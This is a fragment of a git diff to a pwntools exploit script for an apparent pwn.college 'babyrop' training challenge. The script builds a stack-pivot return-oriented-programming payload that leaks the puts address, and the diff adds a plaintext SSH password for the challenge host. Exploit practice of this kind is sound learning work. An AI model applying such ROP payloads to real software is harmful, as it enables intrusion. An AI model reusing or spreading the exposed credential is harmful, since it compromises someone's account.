@@ -1,8 +1,8 @@
 from pwn import *
 
 e = ELF('./babyrop_level9_testing1')
-libc = ELF('../libc6_2.31-0ubuntu9.2_amd64.so')
-s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",keyfile='../../key',port=22)
+libc = ELF('../../libc6_2.31-0ubuntu9.2_amd64.so')
+s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",keyfile='../../csec',port=22,password='djaxod12')
 
 # context.log_level = 0
 p = s.run('/babyrop_level9_testing1')
@@ -18,7 +18,7 @@ csu_run = 0x402180
 input = e.symbols['input']
 
 pay = p64(rbp) + p64(input + 0x218) + p64(leave_ret) + p64(0)*(0x200//8) + p64(input + 0x100)
-pay += p64(rdi) + p64(e.got['puts']) + p64(e.plt['puts '])
+pay += p64(rdi) + p64(e.got['puts']) + p64(e.plt['puts'])
 '''
 .text:0000000000401B6A                 pop     rbx
 .text:0000000000401B6B                 pop     rbp
